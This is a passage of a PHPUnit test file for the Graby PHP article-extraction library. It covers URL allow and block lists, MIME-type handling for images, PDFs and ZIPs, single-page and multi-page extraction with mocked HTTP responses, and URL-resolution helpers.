<?php

namespace Tests\Graby;

use Graby\Graby;
use GuzzleHttp\Psr7\Response;
use Http\Mock\Client as HttpMockClient;
use Monolog\Handler\TestHandler;
use Monolog\Logger;
use PHPUnit\Framework\TestCase;
use Symfony\Bridge\PhpUnit\DnsMock;

class GrabyTest extends TestCase
{
    /**
     * A human IPv4 corresponding to example.com.
     */
    public const AN_IPV4 = '93.184.216.34';

    public function testConstructDefault(): void
    {
        $graby = new Graby(['debug' => true]);

        $this->assertTrue($graby->getConfig('debug'));
        $this->assertSame('info', $graby->getConfig('log_level'));
    }

    public function testGetBadConfig(): void
    {
        $this->expectException(\Exception::class);
        $this->expectExceptionMessage('No config found for key:');

        $graby = new Graby();

        $graby->getConfig('does_not_exists');
    }

    public function dataForConfigOverride(): array
    {
        return [
            ['http_client', ['http_client' => ['rewrite_url' => ['dummy.io' => ['/foo' => '/bar'], 'docs.google.com' => ['/foo' => '/bar']]]]],
        ];
    }

    /**
     * @dataProvider dataForConfigOverride
     */
    public function testConfigOverride(string $key, array $config): void
    {
        $graby = new Graby($config);

        $this->assertSame($config[$key], $graby->getConfig($key));
    }

    /**
     * Parsing method inspired from Twig_Test_IntegrationTestCase.
     */
    public function dataForFetchContent(): array
    {
        $tests = [];

        $fileFixtureIterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(__DIR__ . '/fixtures/sites/'),
            \RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($fileFixtureIterator as $file) {
            if (!preg_match('/\.test$/', $file)) {
                continue;
            }

            $test = (string) file_get_contents($file->getRealpath());

            preg_match('/-----URL-----\s*(.*?)\s*-----URL_EFFECTIVE-----\s*(.*?)\s*-----HEADER-----\s*(.*?)\s*-----LANGUAGE-----\s*(.*?)\s*-----AUTHOR-----\s*(.*?)\s*-----TITLE-----\s*(.*?)\s*-----SUMMARY-----\s*(.*?)\s*-----RAW_CONTENT-----\s*(.*?)\s*-----PARSED_CONTENT-----\s*(.*)/sx', $test, $match);

            $tests[] = [
                $match[1], // url
                $match[2], // url effective
                $match[3], // header
                $match[4], // language
                $match[5], // author
                $match[6], // title
                $match[7], // summary
                $match[8], // raw content
                $match[9], // parsed content
            ];
        }

        return $tests;
    }

    /**
     * @dataProvider dataForFetchContent
     */
    public function testFetchContent(string $url, string $urlEffective, string $header, string $language, string $author, string $title, string $summary, string $rawContent, string $parsedContent): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(200, ['Content-Type' => $header], $rawContent));
        $httpMockClient->addResponse(new Response(200, ['Content-Type' => $header], $rawContent));

        $graby = new Graby([
            'xss_filter' => false,
            'extractor' => [
                'config_builder' => [
                    'site_config' => [
                        __DIR__ . '/fixtures/site_config',
                    ],
                ],
            ],
        ], $httpMockClient);

        $res = $graby->fetchContent($url);

        $this->assertCount(11, $res);

        if ($language) {
            $this->assertSame($language, $res['language']);
        } else {
            $this->assertEmpty($res['language']);
        }

        if ($author) {
            $this->assertSame([$author], $res['authors']);
        } else {
            $this->assertEmpty($res['authors']);
        }

        $this->assertSame($urlEffective, $res['url'], 'Same url');
        $this->assertSame($title, $res['title'], 'Same title');
        $this->assertSame($summary, $res['summary'], 'Same summary');

        $this->assertSame($parsedContent, $res['html'], 'Same html');

        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForAllowed(): array
    {
        return [
            ['feed://wikipedia.org', 'http://wikipedia.org'],
            ['www.wikipedia.org', 'http://www.wikipedia.org'],
        ];
    }

    /**
     * @dataProvider dataForAllowed
     */
    public function testAllowedUrls(string $url, string $urlChanged): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(301, ['Location' => $urlChanged]));
        $httpMockClient->addResponse(new Response(200));

        $graby = new Graby([
            'allowed_urls' => ['wikipedia.org', 'wikimedia.com'],
        ], $httpMockClient);

        $res = $graby->fetchContent($url);

        $this->assertSame($res['url'], $urlChanged);
    }

    public function dataForBlocked(): array
    {
        return [
            ['feed://lexpress.fr'],
            ['www.t411.io'],
        ];
    }

    /**
     * @dataProvider dataForBlocked
     */
    public function testBlockedUrls(string $url): void
    {
        $this->expectException(\Exception::class);
        $this->expectExceptionMessage('is not allowed to be parsed.');

        $graby = new Graby([
            'blocked_urls' => ['t411.io', 'lexpress.fr'],
        ]);

        $graby->fetchContent($url);
    }

    public function dataForNotValid(): array
    {
        return [
            ['http://lexpress devant.fr'],
            ['http://user@:80'],
            ['http://cest^long.fr'],
        ];
    }

    /**
     * @dataProvider dataForNotValid
     */
    public function testNotValidUrls(string $url): void
    {
        $this->expectException(\InvalidArgumentException::class);

        $graby = new Graby();
        $graby->fetchContent($url);
    }

    public function testBlockedUrlsAfterFetch(): void
    {
        $this->expectException(\Exception::class);
        $this->expectExceptionMessage('is not allowed to be parsed.');

        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(200));

        $graby = new Graby([
            'blocked_urls' => ['t411.io'],
        ], $httpMockClient);

        $graby->fetchContent('t411.io');
    }

    public function testMimeTypeActionLink(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(200, ['Content-Type' => 'image/jpeg']));

        $graby = new Graby(['xss_filter' => false], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/my%20awesome%20image.jpg');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Image', $res['title']);
        $this->assertSame('<a href="http://example.com/my%20awesome%20image.jpg"><img src="http://example.com/my%20awesome%20image.jpg" alt="Image" /></a>', $res['html']);
        $this->assertSame('http://example.com/my%20awesome%20image.jpg', $res['url']);
        $this->assertEmpty($res['summary']);
        $this->assertSame('image/jpeg', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testMimeTypeActionExclude(): void
    {
        $this->expectException(\Exception::class);
        $this->expectExceptionMessage('is blocked by mime action.');

        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/x-msdownload']
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/x-msdownload']
        ));

        $graby = new Graby([
            'content_type_exc' => [
               'application/x-msdownload' => ['action' => 'exclude', 'name' => 'we do not want virus'],
            ],
        ], $httpMockClient);

        $graby->fetchContent('http://example.com/virus.exe');

        $this->assertCount(2, $httpMockClient->getRequests());
        $this->assertSame('HEAD', $httpMockClient->getRequests()[0]->getMethod());
        $this->assertSame('GET', $httpMockClient->getRequests()[1]->getMethod());
    }

    public function dataForExtension(): array
    {
        return [
            ['http://example.com/test.jpg', 'image/jpeg', 'Image', '', '<a href="http://example.com/test.jpg"><img src="http://example.com/test.jpg" alt="Image" /></a>'],
        ];
    }

    /**
     * @dataProvider dataForExtension
     */
    public function testAssetExtension(string $url, string $header, string $title, string $summary, string $html): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => $header]
        ));

        $graby = new Graby(['xss_filter' => false], $httpMockClient);

        $res = $graby->fetchContent($url);

        $this->assertCount(1, $httpMockClient->getRequests());
        $this->assertSame('HEAD', $httpMockClient->getRequests()[0]->getMethod());
        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame($title, $res['title']);
        $this->assertSame($html, $res['html']);
        $this->assertSame($url, $res['url']);
        $this->assertSame($summary, $res['summary']);
        $this->assertSame($header, $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionPDF(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/pdf'],
            (string) file_get_contents(__DIR__ . '/fixtures/document1.pdf')
        ));

        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/test.pdf');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Document1', $res['title']);
        $this->assertStringContainsString('Document title', $res['html']);
        $this->assertStringContainsString('Morbi vulputate tincidunt ve nenatis.', $res['html']);
        $this->assertStringContainsString('http://example.com/test.pdf', $res['url']);
        $this->assertStringContainsString('Document title Calibri : Lorem ipsum dolor sit amet', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionZIP(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/zip']
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/zip']
        ));

        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('https://github.com/nathanaccidentally/Cydia-Repo-Template/archive/master.zip');

        $this->assertCount(2, $httpMockClient->getRequests());
        $this->assertSame('HEAD', $httpMockClient->getRequests()[0]->getMethod());
        $this->assertSame('GET', $httpMockClient->getRequests()[1]->getMethod());

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('ZIP', $res['title']);
        $this->assertStringContainsString('<a href="https://github.com/nathanaccidentally/Cydia-Repo-Template/archive/master.zip">Download ZIP</a>', $res['html']);
        $this->assertSame('application/zip', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionPDFWithArrayDetails(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/pdf'],
            (string) file_get_contents(__DIR__ . '/fixtures/Document1_pdfcreator.pdf')
        ));
        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/test.pdf');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('2013-09-01T22:20:38+02:00', $res['date']);
        $this->assertSame(['Sebastien MALOT'], $res['authors']);
        $this->assertSame('Document1', $res['title']);
        $this->assertStringContainsString('orem ipsum dolor sit amet', $res['html']);
        $this->assertStringContainsString('http://example.com/test.pdf', $res['url']);
        $this->assertStringContainsString('orem ipsum dolor sit amet', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionTXT(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(200, ['Content-Type' => 'text/plain'], 'plain text :)'));

        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/test.txt');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Plain text', $res['title']);
        $this->assertSame('<pre>plain text :)</pre>', $res['html']);
        $this->assertSame('http://example.com/test.txt', $res['url']);
        $this->assertSame('plain text :)', $res['summary']);
        $this->assertSame('text/plain', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForSinglePage(): array
    {
        return [
            'single_page_link will return a string (ie the text content of <a> node)' => ['singlepage1.com', 'http://singlepage1.com/printed view', 'http://moreintelligentlife.com/print/content'],
            'single_page_link will return the a node' => ['singlepage2.com', 'http://singlepage2.com/print/content', 'http://singlepage2.com/print/content'],
            'single_page_link will return the href from a node' => ['singlepage3.com', 'http://singlepage3.com/print/content', 'http://singlepage3.com/print/content'],
            'single_page_link will return nothing useful' => ['singlepage4.com', 'http://singlepage4.com', 'http://singlepage4.com/print/content'],
            'single_page_link will return the href from a node BUT the single page url will be the same' => ['singlepage3.com/print/content', 'http://singlepage3.com/print/content', 'http://singlepage3.com/print/content'],
        ];
    }

    /**
     * @group dns-sensitive
     * @dataProvider dataForSinglePage
     */
    public function testSinglePage(string $url, string $expectedUrl, string $singlePageUrl): void
    {
        DnsMock::withMockedHosts([
            'singlepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage2.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage3.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage4.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'moreintelligentlife.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);

        $httpMockClient = new HttpMockClient();
        $response = new Response(
            200,
            [
                'Content-Type' => 'text/html',
                'Content-Language' => 'en',
            ],
            <<<"HTML"
<html><h1 class="print-title">my title</h1><div class="print-submitted">my content</div><ul>
<li class="service-links-print">
    <a href="$singlePageUrl" class="service-links-print">printed view</a>
</li></ul></html>
HTML
        );
        $httpMockClient->addResponse($response);
        $httpMockClient->addResponse($response);

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://' . $url);

        $this->assertCount(11, $res);
        $this->assertSame('en', $res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertSame('my content', $res['html']);
        $this->assertSame($expectedUrl, $res['url']);
        $this->assertSame('my content', $res['summary']);
        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testSinglePageMimeAction(): void
    {
        DnsMock::withMockedHosts([
            'singlepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);

        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h1 class="print-title">my title</h1><div class="print-submitted">my content</div><ul><li class="service-links-print"><a href="http://moreintelligentlife.com/print/content" class="service-links-print">printed view</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'image/jpeg'],
            '<html><h1 class="print-title">my title</h1><div class="print-submitted">my content</div><ul><li class="service-links-print"><a href="http://moreintelligentlife.com/print/content" class="service-links-print">printed view</a></li></ul></html>'
        ));

        $graby = new Graby(['xss_filter' => false, 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://singlepage1.com/data.jpg');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Image', $res['title']);
        $this->assertSame('<a href="http://singlepage1.com/data.jpg"><img src="http://singlepage1.com/data.jpg" alt="Image" /></a>', $res['html']);
        $this->assertSame('http://singlepage1.com/data.jpg', $res['url']);
        $this->assertSame('', $res['summary']);
        $this->assertSame('image/jpeg', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testSinglePageReloadSiteConfig(): void
    {
        DnsMock::withMockedHosts([
            'singlepage2.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage5.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);

        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h1 class="print-title">my title</h1><div class="print-submitted">my singlepage2</div><ul><li class="service-links-print"><a href="http://singlepage5.com/hello" class="service-links-print">printed view</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h1 class="print-title">my title</h1><div class="main-article">my singlepage5</div></html>'
        ));

        $graby = new Graby(['debug' => true, 'xss_filter' => false, 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://singlepage2.com/hello');

        $this->assertStringContainsString('my singlepage5', $res['html']);
        $this->assertSame('http://singlepage5.com/hello', $res['url']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageOk(): void
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertSame('my content<div class="story">my content</div>', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content my content', $res['summary']);
        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageMimeAction(): void
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com/data.pdf">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'application/pdf'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertStringContainsString('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageExtractFailed(): void
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            ''
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertStringContainsString('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageBadAbsoluteUrl(): void
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="/:/">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="/:/">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertStringContainsString('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageSameUrl(): void
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="http://multiplepage1.com">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="http://multiplepage1.com">next page</a></li></ul></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertStringContainsString('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForExcerpt(): array
    {
        return [
            ['hello you are fine', 35, null, 'hello you are fine'],
            ['hello you are fine ok ?', 14, null, 'hello you are fine'],
            // breakpoint in on the last word, won't add separator
            ['hello you are fine', 16, '...', 'hello you are fine'],
            ['hello "you" are fine', 15, '...', 'hello "you" are...'],
            ['hello <p>you</p> are fine', 13, '...', 'hello you are...'],
            ["hello you\n are fine", 13, '...', 'hello you are...'],
            [\chr(0xC2) . \chr(0xA0) . 'hello you are fine', 13, '...', 'hello you are...'],
            ['hello you are fine' . \chr(0xC2) . \chr(0xA0), 13, '...', 'hello you are...'],
        ];
    }

    /**
     * @dataProvider dataForExcerpt
     */
    public function testGetExcerpt(string $text, int $length, ?string $separator, string $expectedResult): void
    {
        $graby = new Graby();

        $reflection = new \ReflectionClass(\get_class($graby));
        $method = $reflection->getMethod('getExcerpt');
        $method->setAccessible(true);

        $res = $method->invokeArgs($graby, [$text, $length, $separator]);

        $this->assertSame($expectedResult, $res);
    }

    public function dataForMakeAbsoluteStr(): array
    {
        return [
            ['example.org', '/test', false],
            ['http://example.org', '/test', 'http://example.org/test'],
            ['http://example.org', '', false],
            ['http://example.org//test', 'super', 'http://example.org//super'],
            ['http://example.org//test', 'http://sample.com', 'http://sample.com'],
            ['http://example.org/?d=2021/helloworld', 'img/foobar.jpg', 'http://example.org/img/foobar.jpg'],
            ['http://example.org/folder/page.html', 'visual.jpg', 'http://example.org/folder/visual.jpg'],
            ['http://example.org/page', 'visual.jpg', 'http://example.org/visual.jpg'],
            ['http://example.org/folder/', '../visual.jpg', 'http://example.org/visual.jpg'],
        ];
    }

    /**
     * @dataProvider dataForMakeAbsoluteStr
     *
     * @param string|false $expectedResult
     */
    public function testMakeAbsoluteStr(string $base, string $url, $expectedResult): void
    {
        $graby = new Graby();

        $reflection = new \ReflectionClass(\get_class($graby));
        $method = $reflection->getMethod('makeAbsoluteStr');
        $method->setAccessible(true);

        $res = $method->invokeArgs($graby, [$base, $url]);

        $this->assertSame($expectedResult, $res);
    }

    public function dataForMakeAbsoluteAttr(): array
    {
        return [
            ['http://example.org', '<a href="/lol">test</a>', 'href', 'href', 'http://example.org/lol'],
            ['http://example.org', '<img src="/lol.jpg">test</img>', 'src', 'src', 'http://example.org/lol.jpg'],
            ['http://example.org', '<img src=" /path/to/image.jpg" />', 'src', 'src', 'http://example.org/path/to/image.jpg'],
            ['http://example.org', '<a href="/lol">test</a>', 'src', 'src', ''],
            ['http://example.org', '<iframe src="/lol" />', 'src', 'src', 'http://example.org/lol'],
            ['http://example.org', '<a href="#fn-ref-23">1</a>', 'href', 'href', 'http://example.org#fn-ref-23'],
            ['http://example.org', '<a href="http://Alors que de nombreux indicateurs ont viré au rouge ces derniers mois, voilà une courbe qui regarde vers le haut. Le nombre de demandeurs d’emploi inscrits en formation atteint des sommets. En janvier 2021 par exemple, 110 000 chômeurs sont entrés en formation, soit 87 % de plus qu’en janvier 2020. On doit cette bonne nouvelle aux acteurs de la formation, qui ont mis le bleu de chauffe. Depuis le début de l’année, les formations financées par les conseils régionaux ont progressé de 16 %, et celles de Pôle Emploi de 48 %. Mais l’explication principale vient de la montée en puissance du Compte personnel de formation (CPF). Depuis début 2021, il est responsable de 39 % des inscriptions en formation, soit une hausse de 163 % par rapport à 2020.  Il est encore trop tôt pour tirer un bilan complet de ce nouveau visage de la formation. Mais il convient de rester vigilant avant de s’en réjouir, car pour le moment, les bénéficiaires d’une formation CPF sont plus qualifiés et moins éloignés de l’emploi que dans les formations habituelles, explique Pôle Emploi. Les formations financées via la mobilisation du CPF ont également davantage pour objectif « le perfectionnement et l’élargissement de compétences » que dans les anciens dispositifs. Dans la mesure où la crise va durablement affaiblir certains secteurs, et en faire émerger d’autres, il n’est pas garanti que les formations de perfectionnement soient suffisantes.  Vincent Grimault  En savoir plus : Formation professionnelle : pourquoi ça marche si mal">Test</a>', 'href', 'href', 'http://Alors%20que%20de%20nombreux%20indicateurs%20ont%20viré%20au%20rouge%20ces%20derniers%20mois,%20voilà%20une%20courbe%20qui%20regarde%20vers%20le%20haut.%20Le%20nombre%20de%20demandeurs%20d’emploi%20inscrits%20en%20formation%20atteint%20des%20sommets.%20En%20janvier%202021%20par%20exemple,%20110%20000%20chômeurs%20sont%20entrés%20en%20formation,%20soit%2087%20%%20de%20plus%20qu’en%20janvier%202020.%20On%20doit%20cette%20bonne%20nouvelle%20aux%20acteurs%20de%20la%20formation,%20qui%20ont%20mis%20le%20bleu%20de%20chauffe.%20Depuis%20le%20début%20de%20l’année,%20les%20formations%20financées%20par%20les%20conseils%20régionaux%20ont%20progressé%20de%2016%20%,%20et%20celles%20de%20Pôle%20Emploi%20de%2048%20%.%20Mais%20l’explication%20principale%20vient%20de%20la%20montée%20en%20puissance%20du%20Compte%20personnel%20de%20formation%20(CPF).%20Depuis%20début%202021,%20il%20est%20responsable%20de%2039%20%%20des%20inscriptions%20en%20formation,%20soit%20une%20hausse%20de%20163%20%%20par%20rapport%20à%202020.%20%20Il%20est%20encore%20trop%20tôt%20pour%20tirer%20un%20bilan%20complet%20de%20ce%20nouveau%20visage%20de%20la%20formation.%20Mais%20il%20convient%20de%20rester%20vigilant%20avant%20de%20s’en%20réjouir,%20car%20pour%20le%20moment,%20les%20bénéficiaires%20d’une%20formation%20CPF%20sont%20plus%20qualifiés%20et%20moins%20éloignés%20de%20l’emploi%20que%20dans%20les%20formations%20habituelles,%20explique%20Pôle%20Emploi.%20Les%20formations%20financées%20via%20la%20mobilisation%20du%20CPF%20ont%20également%20davantage%20pour%20objectif%20«%20le%20perfectionnement%20et%20l’élargissement%20de%20compétences%20»%20que%20dans%20les%20anciens%20dispositifs.%20Dans%20la%20mesure%20où%20la%20crise%20va%20durablement%20affaiblir%20certains%20secteurs,%20et%20en%20faire%20émerger%20d’autres,%20il%20n’est%20pas%20garanti%20que%20les%20formations%20de%20perfectionnement%20soient%20suffisantes.%20%20Vincent%20Grimault%20%20En%20savoir%20plus%20:%20Formation%20professionnelle%20:%20pourquoi%20ça%20marche%20si%20mal'],
        ];
    }

    /**
     * @dataProvider dataForMakeAbsoluteAttr
     */
    public function testMakeAbsoluteAttr(string $base, string $string, string $attr, string $expectedAttr, string $expectedResult): void
    {
        $graby = new Graby();

        $doc = new \DOMDocument();
        $doc->loadXML($string);

        /** @var \DOMElement */
        $e = $doc->documentElement;

        $reflection = new \ReflectionClass(\get_class($graby));
        $method = $reflection->getMethod('makeAbsoluteAttr');
        $method->setAccessible(true);

        $method->invokeArgs($graby, [$base, $e, $attr]);

        $this->assertSame($expectedResult, $e->getAttribute($expectedAttr));
    }

    public function dataForMakeAbsolute(): array
    {
        return [
            ['http://example.org', '<a href="/lol">test</a>', 'href', 'http://example.org/lol'],
            ['http://example.org', '<img src="/lol.jpg">test</img>', 'src', 'http://example.org/lol.jpg'],
            ['http://example.org', '<img src="//domain.com/lol.jpg">test</img>', 'src', 'http://domain.com/lol.jpg'],
            ['http://example.org', '<img src=" /path/to/image.jpg" />', 'src', 'http://example.org/path/to/image.jpg'],
            ['http://example.org', '<a href="/lol">test</a>', 'src', ''],
        ];
    }

    /**
     * @dataProvider dataForMakeAbsolute
     */
    public function testMakeAbsolute(string $base, string $string, string $expectedAttr, string $expectedResult): void
    {
        $graby = new Graby();

        $doc = new \DOMDocument();
        $doc->loadXML($string);

        /** @var \DOMElement */
        $e = $doc->documentElement;

        $reflection = new \ReflectionClass(\get_class($graby));
